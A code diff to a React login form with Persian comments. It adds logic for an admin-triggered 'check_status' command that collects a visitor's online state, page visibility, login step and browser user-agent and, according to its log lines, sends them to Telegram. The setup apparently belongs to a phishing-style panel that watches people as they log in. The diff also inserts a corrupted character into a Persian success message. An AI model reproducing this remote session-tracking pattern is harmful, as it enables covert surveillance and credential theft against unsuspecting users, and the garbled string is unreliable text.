@@ -213,15 +213,43 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی وضعیت کاربر و ارسال به تلگرام
+        // بررسی دقیق وضعیت کاربر
         console.log("🔍 Admin requested status check for session:", sessionId);
+
+        const isVisible = !document.hidden;
+        const isOnline = navigator.onLine;
+        const currentTime = new Date().toLocaleString("fa-IR");
+
+        let statusText = "offline";
+        let statusEmoji = "🔴";
+
+        if (isOnline && isVisible) {
+          statusText = "online";
+          statusEmoji = "🟢";
+        } else if (isOnline && !isVisible) {
+          statusText = "away";
+          statusEmoji = "🟡";
+        } else if (!isOnline) {
+          statusText = "offline";
+          statusEmoji = "📵";
+        }
+
+        console.log("📊 Current status:", {
+          isVisible,
+          isOnline,
+          statusText,
+          statusEmoji,
+          currentStep,
+          userAgent: navigator.userAgent.slice(0, 50),
+        });
+
         updateUserOnlineStatus(
           sessionId,
-          true, // کاربر در حال استفاده از سایت است
-          !document.hidden, // صفحه قابل مشاهده است یا نه
-          Date.now(), // آخرین فعالیت همین الان
-          document.hidden ? "away" : "online", // وضعیت بر اساس visibility
-          document.hidden ? "🟡" : "🟢", // ایموجی مناسب
+          isOnline,
+          isVisible,
+          Date.now(),
+          statusText,
+          statusEmoji,
         ).then(() => {
           console.log("✅ Status check completed and sent to Telegram");
         }).catch((error) => {
@@ -233,7 +261,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("🎉 احراز هویت ب�� موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
